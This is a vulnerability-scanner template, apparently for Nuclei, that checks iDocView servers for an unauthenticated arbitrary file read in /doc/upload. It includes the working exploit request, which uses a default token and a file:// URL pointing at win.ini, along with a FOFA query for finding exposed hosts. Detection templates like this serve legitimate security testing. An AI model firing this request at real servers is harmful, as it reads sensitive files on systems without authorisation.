id: idocview-doc-upload-fileread
info:
  name: iDocview /doc/upload 任意文件读取漏洞
  author: leadlife
  severity: high
  description: iDocView是一个在线文档预览系统， iDocView的 /doc/upload 接口存在任意文件读取漏洞，未授权的攻击者可以利用此接口并携带默认token读取服务器敏感文件
  reference: 
    - changting
  classification:
    cve-id: 
  metadata:
    verified: true
    fofa-query: title=="在线文档预览 - I Doc View"
    hunter-query: demo
    tips:
    repair:
    version:
  tags: 2024,fileread,idocview

http:
  - method: GET
    path:
      - "{{BaseURL}}/doc/upload?token=testtoken&url=file:///C:/windows/win.ini"

    extractors: 
      - type: json
        part: body
        internal: true
        name: get_path
        json:
          - ".srcUrl"

    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains_all(body,'name','srcUrl','rid','uuid','desc')
        condition: and